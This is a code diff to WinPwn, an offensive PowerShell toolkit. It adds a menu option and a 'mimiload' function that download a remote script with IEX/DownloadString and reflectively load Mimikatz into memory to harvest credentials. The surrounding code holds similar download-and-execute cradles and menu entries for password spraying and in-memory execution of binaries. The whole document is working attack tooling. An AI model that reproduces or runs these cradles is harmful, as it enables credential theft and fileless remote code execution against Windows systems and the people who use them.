@@ -2716,6 +2716,12 @@ function fruit
 {
     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
 }
+
+function mimiload
+{
+	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/loadmimi.ps1')
+	loadmimi
+}
     
 function WinPwn
 {
@@ -2861,7 +2867,8 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
 	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
 	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '16. Exit. '
+	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
+        Write-Host -ForegroundColor Green '17. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2882,6 +2889,7 @@ __        ___       ____
             13{sharpcradle -allthosedotnet}
 	        14{sharpcradle -web}
             15{domainpassspray}
+	    16{mimiload}
         
     }
     }
